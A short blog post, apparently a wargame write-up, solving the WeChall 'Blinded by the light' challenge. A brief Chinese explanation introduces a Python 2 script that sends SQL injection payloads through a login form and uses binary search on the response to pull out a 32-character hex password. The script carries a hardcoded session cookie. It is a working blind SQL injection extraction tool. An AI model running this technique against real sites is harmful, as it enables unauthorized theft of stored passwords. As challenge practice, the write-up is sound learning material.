---
title: Blinded by the light
author: rk700
layout: post
categories:
  - writeup
tags:
  - sql
  - wechall
---
<http://www.wechall.net/challenge/blind_light/index.php>  
这道题是盲注，32位的HEX，正好用了128次query

下面是python代码

{% highlight python %}
#!/usr/bin/env python2

import urllib
import urllib2

def makePayload(statement):
    return "' or substring(password, %d, 1)%s'%s" % (statement[0], statement[1], statement[2])
    
def checkResponse(response):
    return response.find("Welcome back") > 0

def doAssert(statement):
    url = 'http://www.wechall.net/challenge/blind_light/index.php'
    values = {'injection':makePayload(statement),'inject':'Inject'}
    data = urllib.urlencode(values)
    req = urllib2.Request(url, data)
    req.add_header('cookie','WC=7374566-11403-7iblKzppaCoukyl1')
    response = urllib2.urlopen(req)
    content = response.read()

    return checkResponse(content)
 
if __name__ == "__main__":
    alphalist = "0123456789ABCDEF"
    result = []
    for idx in range(1,33):
        start = 0
        end = 16 #[start, end)
        while (start < end):
            #print("[%d, %d)" % (start, end))
            if (end - start == 1):
                result.append(alphalist[start])
                break
            else:
                middle = (start + end)/2
                if(doAssert([idx, '<', alphalist[middle]])):
                    end = middle
                else:
                    start = middle
    print ''.join(result)
{% endhighlight %}